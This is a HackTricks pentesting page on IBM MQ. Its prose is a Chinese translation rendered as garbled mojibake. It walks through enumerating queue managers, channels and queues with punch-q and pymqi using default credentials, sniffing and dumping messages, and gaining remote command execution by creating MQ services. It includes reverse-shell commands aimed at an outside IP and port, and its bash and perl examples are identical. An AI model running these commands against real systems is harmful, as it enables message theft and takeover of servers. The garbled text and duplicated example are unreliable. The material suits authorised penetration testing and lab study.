# 1414 - Pentesting IBM MQ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€‚
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)ã€‚
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–**ç”µæŠ¥ç¾¤ç»„**æˆ–åœ¨**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ã€‚

* é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

IBM MQæ˜¯IBMçš„ä¸€é¡¹æŠ€æœ¯ï¼Œç”¨äºç®¡ç†æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä¸å…¶ä»–**æ¶ˆæ¯ä»£ç†**æŠ€æœ¯ä¸€æ ·ï¼Œå®ƒä¸“é—¨ç”¨äºåœ¨ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´æ¥æ”¶ã€å­˜å‚¨ã€å¤„ç†å’Œåˆ†ç±»ä¿¡æ¯ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**å®ƒå…¬å¼€IBM MQ TCPç«¯å£1414**ã€‚
æœ‰æ—¶ï¼ŒHTTP REST APIå¯ä»¥åœ¨ç«¯å£**9443**ä¸Šå…¬å¼€ã€‚
è¿˜å¯ä»¥é€šè¿‡TCPç«¯å£**9157**è®¿é—®æŒ‡æ ‡ï¼ˆPrometheusï¼‰ã€‚

IBM MQ TCPç«¯å£1414å¯ç”¨äºæ“çºµæ¶ˆæ¯ã€é˜Ÿåˆ—ã€é€šé“ç­‰ï¼Œ**ä¹Ÿå¯ç”¨äºæ§åˆ¶å®ä¾‹**ã€‚

IBMæä¾›äº†å¤§é‡çš„æŠ€æœ¯æ–‡æ¡£ï¼Œå¯åœ¨[https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq)ä¸Šæ‰¾åˆ°ã€‚

## å·¥å…·

å»ºè®®ç”¨äºç®€åŒ–åˆ©ç”¨çš„å·¥å…·æ˜¯**[punch-q](https://github.com/sensepost/punch-q)**ï¼Œä½¿ç”¨Dockerã€‚è¯¥å·¥å…·ç§¯æä½¿ç”¨Pythonåº“`pymqi`ã€‚

å¯¹äºæ›´æ‰‹åŠ¨çš„æ–¹æ³•ï¼Œè¯·ä½¿ç”¨Pythonåº“**[pymqi](https://github.com/dsuch/pymqi)**ã€‚éœ€è¦[IBM MQä¾èµ–é¡¹](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA)ã€‚

### å®‰è£…pymqi

éœ€è¦å®‰è£…å’ŒåŠ è½½**IBM MQä¾èµ–é¡¹**ï¼š

1. åœ¨[https://login.ibm.com/](https://login.ibm.com/)ä¸Šåˆ›å»ºä¸€ä¸ªå¸æˆ·ï¼ˆIBMidï¼‰ã€‚
2. ä»[https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA)ä¸‹è½½IBM MQåº“ã€‚å¯¹äºLinux x86_64ï¼Œä½¿ç”¨**9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ã€‚
3. è§£å‹ç¼©ï¼ˆ`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`ï¼‰ã€‚
4. è¿è¡Œ`sudo ./mqlicense.sh`æ¥å—è®¸å¯æ¡æ¬¾ã€‚

>å¦‚æœæ‚¨ä½¿ç”¨Kali Linuxï¼Œè¯·ä¿®æ”¹æ–‡ä»¶`mqlicense.sh`ï¼šåˆ é™¤/æ³¨é‡Šä»¥ä¸‹è¡Œï¼ˆåœ¨105-110è¡Œä¹‹é—´ï¼‰ï¼š
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. å®‰è£…è¿™äº›è½¯ä»¶åŒ…ï¼š
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ç„¶åï¼Œåœ¨è¿è¡Œå…¶ä»–ä½¿ç”¨è¿™äº›ä¾èµ–é¡¹çš„å·¥å…·ä¹‹å‰ï¼Œä¸´æ—¶å°†`.so`æ–‡ä»¶æ·»åŠ åˆ°LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥å…‹éš†é¡¹ç›®[pymqi](https://github.com/dsuch/pymqi)ï¼šå…¶ä¸­åŒ…å«æœ‰è¶£çš„ä»£ç ç‰‡æ®µã€å¸¸é‡ï¼Œ... æˆ–è€…æ‚¨å¯ä»¥ç›´æ¥å®‰è£…è¯¥åº“ï¼š`pip install pymqi`ã€‚

### ä½¿ç”¨punch-q

#### ä½¿ç”¨Docker

åªéœ€è¿è¡Œï¼š`sudo docker run --rm -ti leonjza/punch-q`ã€‚

#### æ²¡æœ‰Docker

å…‹éš†é¡¹ç›®[punch-q](https://github.com/sensepost/punch-q)ï¼Œç„¶åæŒ‰ç…§è‡ªè¿°æ–‡ä»¶è¿›è¡Œå®‰è£…ï¼ˆ`pip install -r requirements.txt && python3 setup.py install`ï¼‰ã€‚

å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨`punch-q`å‘½ä»¤ã€‚

## æšä¸¾

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**punch-q**æˆ–**pymqi**æ¥æšä¸¾**é˜Ÿåˆ—ç®¡ç†å™¨åç§°ã€ç”¨æˆ·ã€é€šé“å’Œé˜Ÿåˆ—**ã€‚

### é˜Ÿåˆ—ç®¡ç†å™¨

æœ‰æ—¶ï¼Œè·å–é˜Ÿåˆ—ç®¡ç†å™¨åç§°æ—¶æ²¡æœ‰ä»»ä½•ä¿æŠ¤æªæ–½ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### é€šé“

**punch-q** ä½¿ç”¨å†…éƒ¨ï¼ˆå¯ä¿®æ”¹çš„ï¼‰å•è¯åˆ—è¡¨æ¥æŸ¥æ‰¾ç°æœ‰çš„é€šé“ã€‚ä½¿ç”¨ç¤ºä¾‹ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
ä¸€äº› IBM MQ å®ä¾‹æ¥å—**æœªç»èº«ä»½éªŒè¯**çš„ MQ è¯·æ±‚ï¼Œå› æ­¤ä¸éœ€è¦ `--username / --password`ã€‚å½“ç„¶ï¼Œè®¿é—®æƒé™ä¹Ÿå¯èƒ½æœ‰æ‰€ä¸åŒã€‚

ä¸€æ—¦æˆ‘ä»¬è·å¾—ä¸€ä¸ªé€šé“åç§°ï¼ˆè¿™é‡Œæ˜¯ï¼š`DEV.ADMIN.SVRCONN`ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æšä¸¾æ‰€æœ‰å…¶ä»–é€šé“ã€‚

åŸºæœ¬ä¸Šå¯ä»¥ä½¿ç”¨ **pymqi** ä¸­çš„è¿™æ®µä»£ç ç‰‡æ®µ `code/examples/dis_channels.py` æ¥æ‰§è¡Œæšä¸¾ï¼š
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
...ä½† **punch-q** ä¹ŸåµŒå…¥äº†é‚£éƒ¨åˆ†ï¼ˆé™„åŠ æ›´å¤šä¿¡æ¯ï¼ï¼‰ã€‚
å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å¯åŠ¨ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### é˜Ÿåˆ—

æœ‰ä¸€ä¸ªä½¿ç”¨ **pymqi** çš„ä»£ç ç‰‡æ®µ (`dis_queues.py`)ï¼Œä½† **punch-q** å…è®¸æ£€ç´¢æœ‰å…³é˜Ÿåˆ—çš„æ›´å¤šä¿¡æ¯ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## æ”»å‡»

### è½¬å‚¨æ¶ˆæ¯

æ‚¨å¯ä»¥é’ˆå¯¹é˜Ÿåˆ—/é€šé“è¿›è¡Œå®šä½ï¼Œä»¥ä¾¿å—…æ¢/è½¬å‚¨è¿™äº›æ¶ˆæ¯ï¼ˆéç ´åæ€§æ“ä½œï¼‰ã€‚*ç¤ºä¾‹:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ä¸è¦çŠ¹è±«ï¼Œå¯¹æ‰€æœ‰è¯†åˆ«çš„é˜Ÿåˆ—è¿›è¡Œè¿­ä»£ã€‚**

### ä»£ç æ‰§è¡Œ

> åœ¨ç»§ç»­ä¹‹å‰ï¼Œæœ‰ä¸€äº›ç»†èŠ‚ï¼šIBM MQå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œæ§åˆ¶ï¼šMQSCã€PCFã€æ§åˆ¶å‘½ä»¤ã€‚ä¸€äº›å¸¸è§åˆ—è¡¨å¯ä»¥åœ¨[IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison)ä¸­æ‰¾åˆ°ã€‚
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats)ï¼ˆ***å¯ç¼–ç¨‹å‘½ä»¤æ ¼å¼***ï¼‰æ˜¯æˆ‘ä»¬ä¸“æ³¨äºä¸å®ä¾‹è¿œç¨‹äº¤äº’çš„å†…å®¹ã€‚**punch-q**å’Œ**pymqi**éƒ½åŸºäºPCFäº¤äº’ã€‚
>
> æ‚¨å¯ä»¥æ‰¾åˆ°PCFå‘½ä»¤åˆ—è¡¨ï¼š
> * [æ¥è‡ªPCFæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats)ï¼Œä»¥åŠ
> * [æ¥è‡ªå¸¸é‡](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes)ã€‚
>
> ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤æ˜¯`MQCMD_CREATE_SERVICE`ï¼Œå…¶æ–‡æ¡£å¯åœ¨[æ­¤å¤„](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms)æ‰¾åˆ°ã€‚å®ƒä»¥`StartCommand`ä½œä¸ºå‚æ•°ï¼ŒæŒ‡å‘å®ä¾‹ä¸Šçš„æœ¬åœ°ç¨‹åºï¼ˆä¾‹å¦‚ï¼š`/bin/sh`ï¼‰ã€‚
>
> æ–‡æ¡£ä¸­è¿˜å¯¹è¯¥å‘½ä»¤è¿›è¡Œäº†è­¦å‘Šï¼šâ€œæ³¨æ„ï¼šæ­¤å‘½ä»¤å…è®¸ç”¨æˆ·ä»¥mqmæƒé™è¿è¡Œä»»æ„å‘½ä»¤ã€‚å¦‚æœæˆäºˆä½¿ç”¨æ­¤å‘½ä»¤çš„æƒé™ï¼Œæ¶æ„æˆ–ç²—å¿ƒçš„ç”¨æˆ·å¯èƒ½å®šä¹‰ä¸€ä¸ªæŸåæ‚¨ç³»ç»Ÿæˆ–æ•°æ®çš„æœåŠ¡ï¼Œä¾‹å¦‚é€šè¿‡åˆ é™¤å¿…è¦æ–‡ä»¶ã€‚â€
>
> *æ³¨æ„ï¼šå§‹ç»ˆæ ¹æ®IBM MQæ–‡æ¡£ï¼ˆç®¡ç†å‚è€ƒï¼‰çš„è¯´æ³•ï¼Œè¿˜æœ‰ä¸€ä¸ªHTTPç«¯ç‚¹ä½äº`/admin/action/qmgr/{qmgrName}/mqsc`ï¼Œç”¨äºè¿è¡Œç›¸åº”çš„MQSCå‘½ä»¤ä»¥åˆ›å»ºæœåŠ¡ï¼ˆ`DEFINE SERVICE`ï¼‰ã€‚è¿™æ–¹é¢ç›®å‰å°šæœªåœ¨æ­¤å¤„æ¶µç›–ã€‚*

ä½¿ç”¨**punch-q**å¯ä»¥é€šè¿‡PCFè¿›è¡Œè¿œç¨‹ç¨‹åºæ‰§è¡Œçš„æœåŠ¡åˆ›å»º/åˆ é™¤ï¼š

**ç¤ºä¾‹ 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> åœ¨ IBM MQ çš„æ—¥å¿—ä¸­ï¼Œæ‚¨å¯ä»¥è¯»åˆ°å‘½ä»¤å·²æˆåŠŸæ‰§è¡Œï¼š
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

æ‚¨è¿˜å¯ä»¥æšä¸¾æœºå™¨ä¸Šç°æœ‰çš„ç¨‹åºï¼ˆè¿™é‡Œ `/bin/doesnotexist` ... ä¸å­˜åœ¨ï¼‰ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**è¯·æ³¨æ„ï¼Œç¨‹åºå¯åŠ¨æ˜¯å¼‚æ­¥çš„ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ç¬¬äºŒä¸ªé¡¹ç›®æ¥åˆ©ç”¨æ¼æ´** ***(åå‘shellçš„ç›‘å¬å™¨ï¼Œä¸åŒæœåŠ¡ä¸Šçš„æ–‡ä»¶åˆ›å»ºï¼Œé€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®å¤–æ³„...)***

**ç¤ºä¾‹2**

ä¸ºäº†ç®€å•åœ°è·å–åå‘shellï¼Œ**punch-q** è¿˜æä¾›äº†ä¸¤ç§åå‘shellæœ‰æ•ˆè½½è·ï¼š

- ä¸€ä¸ªä½¿ç”¨bash
- ä¸€ä¸ªä½¿ç”¨perl

*å½“ç„¶ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ `execute` å‘½ä»¤æ„å»ºè‡ªå®šä¹‰æœ‰æ•ˆè½½è·ã€‚*

å¯¹äºbashï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
å¯¹äºperlï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### è‡ªå®šä¹‰ PCF

æ‚¨å¯ä»¥æ·±å…¥ç ”ç©¶ IBM MQ æ–‡æ¡£ï¼Œå¹¶ç›´æ¥ä½¿ç”¨ **pymqi** Python åº“æ¥æµ‹è¯• **punch-q** ä¸­æœªå®ç°çš„ç‰¹å®š PCF å‘½ä»¤ã€‚

**ç¤ºä¾‹ï¼š**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
å¦‚æœæ‰¾ä¸åˆ°å¸¸é‡åç§°ï¼Œå¯ä»¥å‚è€ƒ[IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors)ã€‚

> *ä»¥[`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster)ï¼ˆåè¿›åˆ¶ = 73ï¼‰ä¸ºä¾‹ã€‚å®ƒéœ€è¦å‚æ•°`MQCA_CLUSTER_NAME`ï¼ˆåè¿›åˆ¶ = 2029ï¼‰ï¼Œå¯ä»¥æ˜¯`*`ï¼ˆæ–‡æ¡£ï¼šï¼‰ï¼š*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## æµ‹è¯•ç¯å¢ƒ

å¦‚æœè¦æµ‹è¯•IBM MQçš„è¡Œä¸ºå’Œæ¼æ´ï¼Œå¯ä»¥åŸºäºDockerè®¾ç½®æœ¬åœ°ç¯å¢ƒï¼š

1. åœ¨ibm.comå’Œcloud.ibm.comä¸Šæ‹¥æœ‰è´¦æˆ·ã€‚
2. åˆ›å»ºä¸€ä¸ªå®¹å™¨åŒ–çš„IBM MQï¼š
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œèº«ä»½éªŒè¯å·²å¯ç”¨ï¼Œç”¨æˆ·åä¸º `admin`ï¼Œå¯†ç ä¸º `passw0rd`ï¼ˆç¯å¢ƒå˜é‡ `MQ_ADMIN_PASSWORD`ï¼‰ã€‚
åœ¨è¿™é‡Œï¼Œé˜Ÿåˆ—ç®¡ç†å™¨åç§°å·²è®¾ç½®ä¸º `MYQUEUEMGR`ï¼ˆå˜é‡ `MQ_QMGR_NAME`ï¼‰ã€‚

æ‚¨åº”è¯¥å·²ç»å¯åŠ¨å¹¶è¿è¡Œäº†IBM MQï¼Œå¹¶æš´éœ²äº†å…¶ç«¯å£ï¼š
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQçš„æ—§ç‰ˆæœ¬Dockeré•œåƒä½äº: https://hub.docker.com/r/ibmcom/mq/.

## å‚è€ƒèµ„æ–™

* [mgeekyçš„è¦ç‚¹ - "å®ç”¨IBM MQæ¸—é€æµ‹è¯•ç¬”è®°"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq)
